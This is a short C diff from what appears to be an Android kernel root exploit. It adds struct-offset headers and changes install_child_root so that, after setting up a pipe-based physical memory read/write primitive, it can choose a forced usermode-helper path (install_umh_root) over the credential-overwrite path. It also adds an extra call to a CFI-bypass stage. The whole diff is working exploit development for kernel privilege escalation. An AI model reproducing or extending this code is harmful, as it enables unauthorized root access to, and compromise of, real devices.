@@ -1,4 +1,5 @@
 #include "common.h"
+#include "runtime_struct_offsets.h"
 #include <time.h>
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
@@ -286,6 +287,10 @@ void do_pselect_fake_lock_route(void) {
         cfi_last_step = 0;
         cfi_last_errno = 0;
         route_verified = 1;
+        if (active_offsets && active_offsets->off_system_unbound_wq &&
+            !root_child_done) {
+          try_cfi_stage();
+        }
       } else if (try_cfi_stage()) {
         cfi_last_step = 0;
         route_verified = 1;
@@ -429,7 +434,16 @@ int restore_slide_boot_id(int fd) {
 }
 
 int install_child_root(int fd) {
-  return install_pipe_physrw(fd) && install_android_root(fd);
+  if (!install_pipe_physrw(fd)) return 0;
+  if (force_umh_mode && active_offsets &&
+      active_offsets->off_system_unbound_wq &&
+      active_offsets->off_call_usermodehelper_exec_work &&
+      active_offsets->off_ashmem_misc_fops) {
+    /* Forced UMH is an exclusive mode: a partial UMH write must never fall
+     * through into the legacy credential path. */
+    return install_umh_root(fd);
+  }
+  return install_android_root(fd);
 }
 
 int try_cfi_stage(void) {
